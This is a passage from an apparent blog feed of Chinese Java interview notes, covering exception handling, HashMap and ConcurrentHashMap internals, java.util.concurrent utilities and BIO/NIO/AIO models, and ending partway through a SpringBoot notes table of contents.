</p><p>直到JDK7中新增了try-with-resource语法，才实现了这一功能。</p><p>那什么是try-with-resource呢？简而言之，当一个外部资源的句柄对象（比如FileInputStream对象）实现了AutoCloseable接口，那么就可以将上面的板式代码简化为如下形式：</p><p> <img src="image-20200331181450895.png" alt></p><p><img src="image-20200331181458549.png" alt></p><p><img src="image-20200331181508292.png" alt></p><p>Finally是先于return执行的逻辑（因为无论是什么情况finally都会被执行的。） </p><p>将上述代码改造</p><p> <img src="image-20200331181520292.png" alt></p><p> <img src="image-20200331181527546.png" alt></p><p>Finally会在catch中return前执行，然后再执行catch中的代码。</p><p>抛出的异常<font color="orange">最多只会被catch一次</font>，被一个异常处理器处理，且catch块是<font color="red">按顺序</font>进行匹配的。</p><p>尽量不要捕获如Exception这样的<font color="red">通用异常</font>，而是应该捕获<font color="red">特定的异常</font>。一是为了代码更加清晰，二是为了不要捕获到我们不需要捕获的异常。</p><p><img src="image-20200331181652613.png" alt></p><p>这样也有问题。就是不要生吞异常：即将异常捕获却不做处理，难以定位并解决问题。</p><h2><span id="java异常的处理原则">Java异常的处理原则</span></h2><p>Ø 具体明确：抛出的异常应通过异常类名和message准确说明异常的类型和产生异常的原因；</p><p>Ø 提早抛出：应尽可能早的发现并抛出异常，便于精确定位问题；</p><p>Ø 延迟捕获：异常的捕获和处理应尽可能延迟，<font color="orange"><strong>让掌握更多信息的作用域来处理异常</strong></font></p><p>Ø 不生吞异常，不泛化异常。</p><h2><span id="高效主流的异常处理框架">高效主流的异常处理框架</span></h2><p><strong>在用户看来，应用系统发生的所有异常都是应用系统内部的异常</strong></p><p>Ø 设计一个通用的继承自RuntimeException的异常来统一处理</p><p>Ø 其余异常都统一转译为上述异常AppException</p><p>Ø 在catch之后，抛出上述异常的子类，并提供足以定位的信息</p><p>Ø 由前端接收AppException做统一处理</p><p><img src="image-20200331182250395.png" alt></p><h2><span id="try-catch的性能">Try-catch的性能</span></h2><h3><span id="java异常处理消耗性能的地方">Java异常处理消耗性能的地方【】</span></h3><p>Ø Try-catch块影响JVM的优化</p><p>Ø 异常对象实例需要保存栈快照等信息，开销较大 </p><p>Try catch开销较大，因此只在必要的代码段用try catch包住。 </p><h2><span id="java集合框架">Java集合框架</span></h2><h3><span id="数据结构考点">数据结构考点</span></h3><p>Ø 数组和链表的区别；</p><ul><li><p>数组静态分配内存，链表动态分配内存；</p></li><li><p>数组在内存中连续，链表不连续；</p></li><li><p>数组利用下标定位，时间复杂度为O(1)，链表定位元素时间复杂度O(n)；</p></li><li><p>数组插入或删除元素的时间复杂度O(n)，链表的时间复杂度O(1)。</p></li></ul><p>Ø 链表的操作，如反转，链表环路检测，双向链表，循环链表相关操作；</p><p>Ø 队列，栈的应用；</p><p>Ø 二叉树的遍历方式及其递归和非递归的实现</p><p>Ø 红黑树的旋转</p><h3><span id="算法考点">算法考点</span></h3><p>Ø 内部排序：如递归排序、交换排序（冒泡、快排）、选择排序、插入排序；</p><p>Ø 外部排序：应掌握如何利用有限的内存配合海量的外部存储来处理超大的数据集，写不出来也要有相关的思路</p><h3><span id="考点拓展">考点拓展</span></h3><p>Ø 哪些排序是不稳定的，稳定意味着什么</p><p>稳定的算法：归并、冒泡、插入</p><p>不稳定：快排、选择排序、堆排序</p><p>排序前两个相等的数其在序列的前后位置顺序和排序后它们两个的前后位置顺序相同</p><p>Ø 不同数据集，各种排序最好最差的情况</p><p>Ø 如何优化算法</p><p><img src="image-20200331182401175.png" alt></p><p><img src="image-20200331182420309.png" alt></p><p>Comparable接口：</p><p>必须实现 equals compareTo 和 Hashcode</p><p>CompareTo方法：<strong>自然排序</strong></p><p><img src="image-20200331182440072.png" alt></p><p><img src="image-20200331182449763.png" alt></p><p>这是在外部实现的comparator的<strong>客户化排序</strong></p><p><img src="image-20200331182506916.png" alt></p><p><img src="image-20200331182515418.png" alt></p><p>最后却打印出了一个元素，是因为compare方法重写了，认为名字相同就是同一个对象，而由于set不能保存同一个对象，因此只有一个结果。</p><p>因此</p><p><font color="red"><strong>如果客户化排序和自然排序共存，则以客户化排序为主。</strong></font></p><h2><span id="集合之map">集合之Map</span></h2><h2><span id="为什么重写equals要重写hashcode">为什么重写equals要重写HashCode</span></h2><p>因为不重写 equals 方法，执行 user1.equals(user2) 比较的就是两个对象的地址（即 user1 == user2），肯定是不相等的。</p><p><strong>hashCode</strong> <strong>是用于散列数据的快速存取，如利用</strong> <strong>HashSet/HashMap/Hashtable</strong> <strong>类来存储数据时，都会根据存储对象的</strong> <strong>hashCode</strong> <strong>值来进行判断是否相同的。</strong></p><p>下面以HashSet为例进行分析，我们都知道：在hashset中不允许出现重复对象，元素的位置也是不确定的。在hashset中又是怎样判定元素是否重复的呢？在java的集合中，判断两个对象是否相等的规则是：<br>     1.判断两个对象的hashCode是否相等</p><p>​       如果不相等，认为两个对象也不相等，完毕<br>​        如果相等，转入2<br>​      （这一点只是为了提高存储效率而要求的，其实理论上没有也可以，但如果没有，实际使用时效率会大大降低，所以我们这里将其做为必需的。）</p><p>​     2.判断两个对象用equals运算是否相等<br>​       如果不相等，认为两个对象也不相等<br>​       如果相等，认为两个对象相等（equals()是判断两个对象是否相等的关键）<br>​       为什么是两条准则，难道用第一条不行吗？不行，因为前面已经说了，hashcode()相等时，equals()方法也可能不等，所以必须用第2条准则进行限制，才能保证加入的为非重复元素。</p><p>Map中的Key是用set组成的，value是用collection组织起来的。</p><p> <img src="image-20200331182620663.png" alt></p><h3><span id="hashmap-hashtable-concurrenthashmap的区别">HashMap HashTable ConcurrentHashMap的区别</span></h3><p><img src="image-20200331182635063.png" alt></p><p>默认长度为16</p><p>实际上是通过位运算而不是取模</p><p><img src="image-20200331182648604.png" alt></p><p>Node是由hash值，键值对和next组成的。</p><p>数组分成一个个bucket</p><p>如果链表长度超过TREEIFY_THRESHOLD=8 就会变成红黑树</p><p>少于UNTREEIFY_THREHOLD=6就会变成链表</p><p>HashMap是使用LazyLoad的原则，在首次使用的时候才初始化。</p><p>Resize方法既具备初始化还具备扩容的作用</p><h3><span id="hashmapput方法的逻辑">HashMap：put方法的逻辑</span></h3><ol><li><p>如果HashMap未被初始化，则resize初始化</p></li><li><p>对Key求Hash值，然后再计算下标</p></li><li><p>如果没有碰撞，直接放入桶中</p></li><li><p>如果碰撞了，key相等就取出节点</p></li><li><p>如果是红黑树就以红黑树的方式插入节点，如果为链表以链表的方式链接到后面，</p></li><li><p>如果插入后链表长度超过阈值8，就把链表转成红黑树</p></li><li><p>如果节点已经存在就替换旧值</p></li><li><p>如果桶满了（容量16*加载因子0.75），就需要resize（扩容2倍后重排）</p></li></ol><p>桶就是数组</p><p>Resize后重新计算每个元素在数组中的位置（要么是当前位置要么是当前下标+oldCap）</p><p><img src="image-20200403163716667.png" alt></p><h3><span id="hashmapget方法的逻辑">HashMap：get方法的逻辑</span></h3><ul><li>计算 key 的 hash 值，根据 hash 值找到对应数组下标:     hash &amp; (length-1)</li><li>判断数组该位置处的元素是否刚好就是我们要找的</li><li>如果不是，判断该元素类型是否是 TreeNode，如果是，用红黑树的方法取数据。</li><li>如果不是，遍历链表，直到找到相等(==或equals)的 key。</li></ul><p>扩容<img src="image-20200403163829060.png" alt></p><h3><span id="hashmap如何有效减少碰撞">HashMap：如何有效减少碰撞</span></h3><p>Ø 扰动函数：促使元素位置分布均匀，减少碰撞几率</p><p>Ø 使用final对象，并采用合适的equals()和hashCode()方法</p><h3><span id="为什么不直接用hashcode作为下标">为什么不直接用hashcode作为下标</span></h3><p><img src="image-20200403164018087.png" alt>         </p><p>直接用hashCode作为下标的话太浪费空间，有40亿的空间内存放不下这么大的数组且扩容前数组默认大小才16。混合原始hashCode的高位和低位，加大随机性同时能得到高低位的特征，在数组length较小的时候也能保证高低位参与hash运算当中，也不会有太大开销。最后用位与的操作来替代取模达到更高效率。（因为HashMap的长度是2的n次方，因此可以用取模来替代）</p><p> <img src="image-20200403164029114.png" alt></p><p>扩容因子是0.75，当hashmap填满百分之75的bucket的时候，将会创建原来hashMap 2倍大小的数组，并将原来的对象转移过去。这部叫做rehashing。</p><h3><span id="hashmap扩容问题">HashMap：扩容问题</span></h3><p>Ø 多线程环境下，调整大小会存在条件竞争，容易造成死锁</p><p>Ø Rehashing是一个比较耗时的过程</p><p> 由于HashMap不是线程安全的，因此为了使得其变成线程安全的可以使用</p><h3><span id="collectionssynchronizedmap和hashtable的区别">Collections.synchronizedMap和Hashtable的区别</span></h3><p>在synchronizedMap中有个Object类型的互斥成员，然后使用synchronized关键字修饰</p><p>SynchronizedMap的原理几乎和Hashtable的实现一致，hashtable将public的方法都添加了synchronized关键字。唯一区别就是<font color="orange">锁定的对象不一致。</font></p><p>Hashtable获取的是方法调用者this的锁，而synchronizedMap是使用定义好的成员变量mutex。</p><p>由于这两者在多线程情况下是<font color="orange">串行执行的，效率比较低</font>，因此我们需要ConcurrentHashMap</p><p><img src="image-20200403164302476.png" alt></p><p>现在做法：只锁定当前链表或者红黑树的首节点。</p><p><img src="image-20200403164412266.png" alt></p><p>ConcurrentHashMap不允许插入null key，而HashMap可以。</p><h3><span id="concurrenthashmapput方法的逻辑">ConcurrentHashMap：put方法的逻辑</span></h3><ol><li><p>判断Node[]数组是否初始化，没有则进行初始化操作</p></li><li><p>通过hash定位数组的索引坐标，是否有Node节点，如果没有则使用CAS进行添加（链表的头节点），添加失败则进入下次循环。</p></li><li><p>如果hash为MOVED检查到内部正在扩容，就帮助它一块扩容。</p></li><li><p>如果f!=null，则使用synchronized锁住f元素（链表/红黑二叉树的头元素）</p><p>a)   如果是Node（链表结构）则执行链表的添加操作。</p><p>b)   如果是TreeNode（树型结构）则执行树添加操作。</p><p>c)   如果是reservationNode就抛出异常。</p></li><li><p>判断链表长度已经达到临界值8，当然这个8是默认值，也可以去调整，当节点数超过这个值就需要把链表转换为树结构。</p></li><li><p>判断数组是否需要扩容。</p></li></ol><h3><span id="get-过程分析">get 过程分析</span></h3><ul><li>计算 hash 值</li><li>根据 hash 值找到数组对应位置: (n - 1) &amp; h</li><li>根据该位置处结点性质进行相应查找</li></ul><p>·     如果该位置为 null，那么直接返回 null 就可以了</p><p>·     如果该位置处的节点刚好就是我们需要的，返回该节点的值即可</p><p>·     如果该位置节点的 hash 值小于 0，说明正在扩容，或者是红黑树，</p><p>·     如果以上 3 条都不满足，那就是链表，进行遍历比对即可</p><p>transient volatile int sizeCtl：散列表初始化和扩容的大小都是由该变量来控制。</p><p>·      当为负数时，它正在被初始化或者扩容。</p><p>·     -1表示正在初始化</p><p>·     -N表示N-1个线程正在扩容</p><h3><span id="concurrenthashmap总结比起segment锁拆得更细">ConcurrentHashMap总结：比起Segment，锁拆得更细</span></h3><p>Ø 首先使用无锁操作CAS插入头节点，失败则循环重试</p><p>Ø 若头节点已存在，则尝试获取头节点的同步锁，再进行操作</p><h3><span id="concurrenthashmap别的需要注意的点">ConcurrentHashMap：别的需要注意的点</span></h3><p>Ø size()方法和mappingCount()方法的异同，两者计算是否准确？</p><p>Ø 多线程环境下如何进行扩容</p><h3><span id="三者的区别">三者的区别</span></h3><p>Ø HashMap线程不安全，数组+链表+红黑树</p><p>Ø Hashtable线程安全，锁住整个对象，数组+链表</p><p>Ø ConcurrentHashMap线程安全，CAS+同步锁，数组+链表+红黑树</p><p>Ø HashMap的key、value均可为null，而其他的两个类不支持</p><h2><span id="java-util-concurrentjuc">Java util concurrent（JUC）</span></h2><h3><span id="javautilconcurrent提供了并发编程的解决方案">Java.util.concurrent:提供了并发编程的解决方案</span></h3><p>Ø CAS是java.util.concurrent.atomic包的基础</p><p>Ø AQS是java.util.concurrent.locks包以及一些常用类比如Samophore，ReentrantLock等类的基础</p><h3><span id="juc包的分类">J.U.C包的分类</span></h3><p>Ø 线程执行器executor</p><p>Ø 锁locks</p><p>Ø 原子变量类atomic</p><p>Ø 并发工具类tools</p><p>Ø 并发集合collections</p><p><img src="image-20200403164644589.png" alt></p><h3><span id="并发工具类">并发工具类</span></h3><p>Ø 闭锁CountDownLatch</p><p>Ø 栅栏CyclicBarrier</p><p>Ø 信号量Semaphore</p><p>Ø 交换器Exchanger</p><h4><span id="countdownlatch让主线程等待一组事件发生后继续执行">CountDownLatch：让主线程等待一组事件发生后继续执行</span></h4><p>Ø 事件指的是CountDownLatch里的countDown()方法</p><p>​     <img src="image-20200403164732266.png" alt></p><p>其他线程使用countDown后还会继续执行，并不代表该子线程已经执行完毕了，而是告诉主线程可以继续执行。每次调用countDown的时候cnt都会-1；</p><p> <img src="image-20200403164739889.png" alt></p><h4><span id="cyclicbarrier阻塞当前线程等待其他线程">CyclicBarrier：阻塞当前线程，等待其他线程</span></h4><p>Ø 等待其它线程，且会阻塞自己当前线程，所有线程必须同时到达栅栏位置后，才能继续执行；</p><p>Ø 所有线程到达栅栏处，可以触发执行另外一个预先设置的线程</p><p> <img src="image-20200403164751372.png" alt></p><p>每个线程调用await()的时候，cnt会减一，当cnt不为0的时候，会阻塞。当cnt=0，即所有线程都调用了await()，Ta主线程才会和t1 t2 t3一起执行。</p><p> <img src="image-20200403164805834.png" alt></p><h4><span id="semaphore控制某个资源可被同时访问的线程个数">Semaphore：控制某个资源可被同时访问的线程个数</span></h4><p><img src="image-20200403165110119.png" alt></p><p>· Semaphore 类是一个计数信号量，必须由获取它的线程释放， 通常用于限制可以访问某些资源（物理或逻辑的）线程数目。 </p><p>· 一个信号量有且仅有 3 种操作，且它们全部是原子的。 </p><ul><li>初始化、增加和减少。</li><li>增加可以为一个进程解除阻塞。</li><li>减少可以让一个进程进入阻塞。</li></ul><p>· Semaphore 管理一系列许可证。 </p><ul><li>每个     acquire() 方法阻塞，直到有一个许可证可以获得然后拿走一个许可证。</li><li>每个     release() 方法增加一个许可证，这可能会释放一个阻塞的 acquire() 方法。</li><li>不使用实际的许可对象，Semaphore     只对可用许可的号码进行计数，并采取相应的行动。</li></ul><p>· Semaphore 在计数器不为 0 的时候对线程就放行，一旦达到 0，那么所有请求资源的新线程都会被阻塞，包括增加请求到许可的线程，Semaphore 是<font color="orange">不可重入的</font>。</p><ul><li>每一次请求一个许可都会导致计数器减少 1，同样每次释放一个许可都会导致计数器增加 1，一旦达到 0，新的许可请求线程将被挂起。</li></ul><p>· Semaphore 有两种模式，<strong>公平模式</strong> 和 <strong>非公平模式</strong>。 </p><ul><li><p>公平模式就是调用     acquire 的顺序就是获取许可证的顺序，遵循 FIFO。</p></li><li><p>非公平模式是抢占式的，也就是有可能一个新的获取线程恰好在一个许可证释放时得到了这个许可证，而前面还有等待的线程。</p><p><img src="image-20200403165155908.png" alt></p></li></ul><h4><span id="exchanger两个线程到达同步点后相互交换数据">Exchanger：两个线程到达同步点后，相互交换数据</span></h4><p> <img src="image-20200403165216566.png" alt></p><p> <img src="image-20200403165226727.png" alt></p><p><img src="image-20200403165237352.png" alt></p><h3><span id="blockingqueue提供可阻塞的入队和出队操作">BlockingQueue：提供可阻塞的入队和出队操作</span></h3><p> <img src="image-20200403165244330.png" alt></p><p><strong>主要用于生产者-消费者模式，在多线程场景时生产者线程在队列尾部添加元素，而消费者线程则在队列头部消费元素，通过这种方式能够达到将任务的生产和消费进行隔离的目的</strong></p><p>如果队列满了，入队操作将阻塞，如果队列空了，出队操作将阻塞。</p><p>Add()往队列尾部添加元素，成功返回true，失败抛出IllegalStateException</p><p>Put()往队列尾部添加元素，如果队列满了则阻塞当前线程直到能够添加成功为止</p><p>Offer()往队列尾部添加元素，成功返回true，失败返回false</p><p>Offer还能传参，指定timeout，如果超过timeout的话就会返回false，被中断就会抛出InterruptedException </p><p>Take是从队列头部取出元素，如果元素为空则一直等待有元素为止对应put</p><p>Poll对应offer，是从队列头部取出元素，如果队列为空最多等待timeout指定时间，中断抛出InterruptedException </p><p>remainingCapacity()获取当前队列剩余可存储元素数量 </p><p>remove 从队列移除指定对象 </p><p>contains判断队列中是否存在指定对象 </p><p>drainTo转移到指定集合。</p><h4><span id="blockingqueue类型">BlockingQueue类型</span></h4><p><strong>1.</strong>   <font color="orange"><strong>ArrayBlockingQueue：一个由数组结构组成的有界阻塞队列；</strong></font></p><p><strong>2.</strong>    <font color="orange"><strong>LinkedBlockingQueue：一个由链表结构组成的有界/无界阻塞队列；</strong></font></p><p><strong>3.</strong>   <font color="orange"> <strong>PriorityBlockingQueue：一个支持优先级排序的无界阻塞队列</strong></font></p><p><strong>4.</strong>   <strong>DealyQueue：一个使用优先级队列实现的无界阻塞队列；</strong></p><p><strong>5.</strong>   <strong>SynchronousQueue：一个不存储元素的阻塞队列；</strong></p><p><strong>6.</strong>   <strong>LinkedTransferQueue：一个由链表结构组成的无界阻塞队列；</strong></p><p><strong>7.</strong>   <strong>LinkedBlockingDeque：一个由链表结构组成的双向阻塞队列；</strong></p><p><strong>全都是线程安全的。</strong></p><p>1是FIFO</p><p>2无界指的是Integer.MAX_VALUE  FIFO</p><p>3.带优先级的队列不是FIFO</p><h2><span id="同步与异步">同步与异步</span></h2><ul><li><strong>同步：</strong> 同步就是发起一个调用后，被调用者未处理完请求之前，调用不返回。</li><li><strong>异步：</strong> 异步就是发起一个调用后，立刻得到被调用者的回应表示已接收到请求，但是被调用者并没有返回结果，此时我们可以处理其他的请求，被调用者通常依靠事件，回调等机制来通知调用者其返回结果。</li></ul><h2><span id="阻塞和非阻塞">阻塞和非阻塞</span></h2><ul><li><strong>阻塞：</strong> 阻塞就是发起一个请求，调用者一直等待请求结果返回，也就是当前线程会被挂起，无法从事其他任务，只有当条件就绪才能继续。</li><li><strong>非阻塞：</strong> 非阻塞就是发起一个请求，调用者不用一直等着结果返回，可以先去干其他事情。</li></ul><h2><span id="bio-同步阻塞io模式">BIO (同步阻塞I/O模式)</span></h2><p><img src="image-20200403170310675.png" alt></p><p>数据的读取写入必须阻塞在一个线程内等待其完成。</p><h2><span id="nio同步非阻塞">NIO（同步非阻塞）</span></h2><p><img src="image-20200403170244673.png" alt></p><p>构建多路复用的、同步非阻塞的IO操作</p><h2><span id="aio-异步非阻塞io模型">AIO （异步非阻塞I/O模型）</span></h2><p>基于事件和回调机制的异步非阻塞IO</p><p><img src="image-20200403170137243.png" alt></p><p>Ø 基于回调：实现CompletionHandler接口，调用时触发回调函数</p><p>Ø 返回Future：通过isDone()查看是否准备好，通过get()等待返回数据</p><p>仅仅Select阶段是阻塞的，可以避免大量客户端连接时频繁切换线程带来的问题。</p><h2><span id="nio-如何实现多路复用功能">NIO 如何实现多路复用功能</span></h2><p>Ø Selector选择器可以监听多个Channel通道</p><p>Ø 实现一个线程管理多个Channel，节省线程切换上下文的资源消耗。</p><p>Ø Selector只能管理非阻塞的通道，FileChannel是阻塞的，无法管理。</p><h2><span id="aio-bio-nio的适用场景">AIO、BIO、NIO的适用场景</span></h2><p>·     BIO方式适用于连接数目比较小且固定的架构，这种方式对服务器资源要求比较高，并发局限于应用中，JDK1.4以前的唯一选择。</p><p>·     NIO方式适用于连接数目多且连接比较短（轻操作）的架构，比如聊天服务器，并发局限于应用中，编程比较复杂。</p><p>·     AIO方式使用于连接数目多且连接比较长（重操作）的架构，比如相册服务器，充分调用OS参与并发操作，编程比较复杂，JDK7开始支持。 </p><table><thead><tr><th><strong>属性\模型</strong></th><th><strong>阻塞BIO</strong></th><th><strong>非阻塞NIO</strong></th><th><strong>异步AIO</strong></th></tr></thead><tbody><tr><td><strong>Blocking</strong></td><td>阻塞并同步</td><td>非阻塞但同步</td><td>非阻塞并异步</td></tr><tr><td><strong>线程数（server：client）</strong></td><td>1:1</td><td>1:N</td><td>0:N</td></tr><tr><td><strong>复杂度</strong></td><td>简单</td><td>较复杂</td><td>复杂</td></tr><tr><td><strong>吞吐量</strong></td><td>低</td><td>高</td><td>高</td></tr></tbody></table><h2><span id="nio的核心概念">NIO的核心概念</span></h2><p><strong>1. 缓冲区Buffer</strong></p><p>Buffer是一个对象。它包含一些要写入或者读出的数据。</p><p>在NIO中，所有的数据都是用缓冲区处理。这也就本文上面谈到的IO是面向流的，NIO是面向缓冲区的。</p><p>·     ByteBuffer：字节缓冲区</p><p>·     CharBuffer:字符缓冲区</p><p>·     ShortBuffer：短整型缓冲区</p><p>·     IntBuffer：整型缓冲区</p><p>·     LongBuffer:长整型缓冲区</p><p>·     FloatBuffer：浮点型缓冲区</p><p>·     DoubleBuffer：双精度浮点型缓冲区</p><p><strong>2.通道Channel</strong></p><p>Ø Channel是一个通道，可以通过它读取和写入数据，</p><p>Ø 通道和流不同之处在于通道是双向的</p><p>Ø Channel是全双工的</p><p>Channel有四种实现：</p><p>·     FileChannel:是从文件中读取数据。</p><p>·     DatagramChannel:从UDP网络中读取或者写入数据。</p><p>·     SocketChannel:从TCP网络中读取或者写入数据。</p><p>·     ServerSocketChannel:允许你监听来自TCP的连接，就像服务器一样。每一个连接都会有一个SocketChannel产生。</p><p><strong>3.多路复用器Selector</strong></p><p><img src="image-20200403165738902.png" alt></p><p>Ø Selector选择器可以监听多个Channel通道</p><p>Ø 实现一个线程管理多个Channel，节省线程切换上下文的资源消耗。</p><p>Ø Selector只能管理非阻塞的通道，FileChannel是阻塞的，无法管理。</p><p><img src="image-20200403165814493.png" alt></p><p><img src="image-20200403165805117.png" alt></p><p><img src="image-20200403170112067.png" alt></p><p><img src="image-20200403170119045.png" alt></p><h3><span id="nio应用和框架等等">NIO应用和框架等等</span></h3><p>例如：Dubbo(服务框架)，就默认使用Netty作为基础通信组件，用于实现各进程节点之间的内部通信。</p><p>Netty是目前最流行的一个Java开源框架NIO框架，Netty提供异步的、事件驱动的网络应用程序框架和工具，用以快速开发高性能、高可靠性的网络服务器和客户端程序。</p><p>相比JDK原生NIO，Netty提供了相对十分简单易用的API，非常适合网络编程。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java常用类库与技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot 入门笔记【转】</title>
      <link href="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>SpringBoot 入门笔记</p><a id="more"></a><!-- toc --><ul><li><a href="#一-spring-boot-入门"><strong>一、</strong>Spring Boot 入门</a><ul><li><a href="#1-spring-boot-简介">1、Spring Boot 简介</a></li><li><a href="#2-微服务">2、微服务</a></li><li><a href="#3-环境准备">3、环境准备</a><ul><li><a href="#1-maven设置">1、MAVEN设置；</a></li><li><a href="#2-idea设置">2、IDEA设置</a></li></ul></li><li><a href="#4-spring-boot-helloworld">4、Spring Boot HelloWorld</a><ul><li><a href="#1-创建一个maven工程jar">1、创建一个maven工程；（jar）</a></li><li><a href="#2-导入spring-boot相关的依赖">2、导入spring boot相关的依赖</a></li><li><a href="#3-编写一个主程序启动spring-boot应用">3、编写一个主程序；启动Spring Boot应用</a></li><li><a href="#4-编写相关的controller-service">4、编写相关的Controller、Service</a></li><li><a href="#5-运行主程序测试">5、运行主程序测试</a></li><li><a href="#6-简化部署">6、简化部署</a></li></ul></li><li><a href="#5-hello-world探究">5、Hello World探究</a><ul><li><a href="#1-pom文件">1、POM文件</a><ul><li><a href="#1-父项目">1、父项目</a></li><li><a href="#2-启动器">2、启动器</a></li></ul></li><li><a href="#2-主程序类主入口类">2、主程序类，主入口类</a></li></ul></li><li><a href="#6-使用spring-initializer快速创建spring-boot项目">6、使用Spring Initializer快速创建Spring Boot项目</a><ul><li><a href="#1-idea使用-spring-initializer快速创建项目">1、IDEA：使用 Spring Initializer快速创建项目</a></li><li><a href="#2-sts使用-spring-starter-project快速创建项目">2、STS使用 Spring Starter Project快速创建项目</a></li></ul></li></ul></li><li><a href="#二-配置文件">二、配置文件</a><ul><li><a href="#1-配置文件">1、配置文件</a></li><li><a href="#2-yaml语法">2、YAML语法：</a><ul><li><a href="#1-基本语法">1、基本语法</a></li><li><a href="#2-值的写法">2、值的写法</a><ul><li><a href="#字面量普通的值数字字符串布尔">字面量：普通的值（数字，字符串，布尔）</a></li><li><a href="#对象-map属性和值键值对">对象、Map（属性和值）（键值对）：</a></li><li><a href="#数组list-set">数组（List、Set）：</a></li></ul></li></ul></li><li><a href="#3-配置文件值注入">3、配置文件值注入</a><ul><li><a href="#1-properties配置文件在idea中默认utf-8可能会乱码">1、properties配置文件在idea中默认utf-8可能会乱码</a></li><li><a href="#2-value获取值和configurationproperties获取值比较">2、@Value获取值和@ConfigurationProperties获取值比较</a></li><li><a href="#3-配置文件注入值数据校验">3、配置文件注入值数据校验</a></li><li><a href="#4-propertysourceimportresourcebean">4、@PropertySource&amp;@ImportResource&amp;@Bean</a><ul><li><a href="#1-随机数">1、随机数</a></li><li><a href="#2-占位符获取之前配置的值如果没有可以是用指定默认值">2、占位符获取之前配置的值，如果没有可以是用:指定默认值</a></li></ul></li></ul></li><li><a href="#5-profile">5、Profile</a><ul><li><a href="#1-多profile文件">1、多Profile文件</a></li><li><a href="#2-yml支持多文档块方式">2、yml支持多文档块方式</a></li><li><a href="#3-激活指定profile">3、激活指定profile</a></li></ul></li><li><a href="#6-配置文件加载位置">6、配置文件加载位置</a></li><li><a href="#7-外部配置加载顺序">7、外部配置加载顺序</a></li><li><a href="#8-自动配置原理">8、自动配置原理</a><ul><li><a href="#1-自动配置原理">1、<strong>自动配置原理：</strong></a></li><li><a href="#2-细节">2、细节</a><ul><li><a href="#1-conditional派生注解spring注解版原生的conditional作用">1、@Conditional派生注解（Spring注解版原生的@Conditional作用）</a></li></ul></li></ul></li></ul></li><li><a href="#三-日志">三、日志</a><ul><li><a href="#1-日志框架">1、日志框架</a></li><li><a href="#2-slf4j使用">2、SLF4j使用</a><ul><li><a href="#1-如何在系统中使用slf4j-httpswwwslf4jorg">1、如何在系统中使用SLF4j https://www.slf4j.org</a></li><li><a href="#2-遗留问题">2、遗留问题</a></li></ul></li><li><a href="#3-springboot日志关系">3、SpringBoot日志关系</a></li><li><a href="#4-日志使用">4、日志使用；</a><ul><li><a href="#1-默认配置">1、默认配置</a></li><li><a href="#2-指定配置">2、指定配置</a></li></ul></li><li><a href="#5-切换日志框架">5、切换日志框架</a></li></ul></li><li><a href="#四-web开发">四、Web开发</a><ul><li><a href="#1-简介">1、简介</a></li><li><a href="#2-springboot对静态资源的映射规则">2、SpringBoot对静态资源的映射规则；</a></li><li><a href="#3-模板引擎">3、模板引擎</a><ul><li><a href="#1-引入thymeleaf">1、引入thymeleaf；</a></li><li><a href="#2-thymeleaf使用">2、Thymeleaf使用</a></li><li><a href="#3-语法规则">3、语法规则</a></li></ul></li><li><a href="#4-springmvc自动配置">4、SpringMVC自动配置</a><ul><li><a href="#1-spring-mvc-auto-configuration">1. Spring MVC auto-configuration</a></li><li><a href="#2-扩展springmvc">2、扩展SpringMVC</a></li><li><a href="#3-全面接管springmvc">3、全面接管SpringMVC；</a></li></ul></li><li><a href="#5-如何修改springboot的默认配置">5、如何修改SpringBoot的默认配置</a></li><li><a href="#6-restfulcrud">6、RestfulCRUD</a><ul><li><a href="#1-默认访问首页">1）、默认访问首页</a></li><li><a href="#2-国际化">2）、国际化</a></li><li><a href="#3-登陆">3）、登陆</a></li><li><a href="#4-拦截器进行登陆检查">4）、拦截器进行登陆检查</a></li><li><a href="#5-crud-员工列表">5）、CRUD-员工列表</a><ul><li><a href="#thymeleaf公共页面元素抽取">thymeleaf公共页面元素抽取</a></li></ul></li><li><a href="#6-crud-员工添加">6）、CRUD-员工添加</a></li><li><a href="#7-crud-员工修改">7）、CRUD-员工修改</a></li><li><a href="#8-crud-员工删除">8）、CRUD-员工删除</a></li></ul></li><li><a href="#7-错误处理机制">7、错误处理机制</a><ul><li><a href="#1-springboot默认的错误处理机制">1）、SpringBoot默认的错误处理机制</a></li><li><a href="#2-如果定制错误响应">2）、如果定制错误响应：</a><ul><li><a href="#1-如何定制错误的页面"><strong>1）、如何定制错误的页面；</strong></a></li><li><a href="#2-如何定制错误的json数据">2）、如何定制错误的json数据；</a></li><li><a href="#3-将我们的定制数据携带出去">3）、将我们的定制数据携带出去；</a></li></ul></li></ul></li><li><a href="#8-配置嵌入式servlet容器">8、配置嵌入式Servlet容器</a><ul><li><a href="#1-如何定制和修改servlet容器的相关配置">1）、如何定制和修改Servlet容器的相关配置；</a></li><li><a href="#2-注册servlet三大组件servlet-filter-listener">2）、注册Servlet三大组件【Servlet、Filter、Listener】</a></li><li><a href="#3-替换为其他嵌入式servlet容器">3）、替换为其他嵌入式Servlet容器</a></li><li><a href="#4-嵌入式servlet容器自动配置原理">4）、嵌入式Servlet容器自动配置原理；</a></li></ul></li><li><a href="#9-使用外置的servlet容器">9、使用外置的Servlet容器</a><ul><li><a href="#步骤">步骤</a></li><li><a href="#原理">原理</a></li></ul></li></ul></li><li><a href="#五-docker">五、Docker</a><ul><li><a href="#1-简介-1">1、简介</a></li><li><a href="#2-核心概念">2、核心概念</a></li><li><a href="#3-安装docker">3、安装Docker</a><ul><li><a href="#1-安装linux虚拟机">1）、安装linux虚拟机</a></li><li><a href="#2-在linux虚拟机上安装docker">2）、在linux虚拟机上安装docker</a></li></ul></li><li><a href="#4-docker常用命令操作">4、Docker常用命令&amp;操作</a><ul><li><a href="#1-镜像操作">1）、镜像操作</a></li><li><a href="#2-容器操作">2）、容器操作</a></li><li><a href="#3-安装mysql示例">3）、安装MySQL示例</a></li></ul></li></ul></li><li><a href="#六-springboot与数据访问">六、SpringBoot与数据访问</a><ul><li><a href="#1-jdbc">1、JDBC</a></li><li><a href="#2-整合druid数据源">2、整合Druid数据源</a></li><li><a 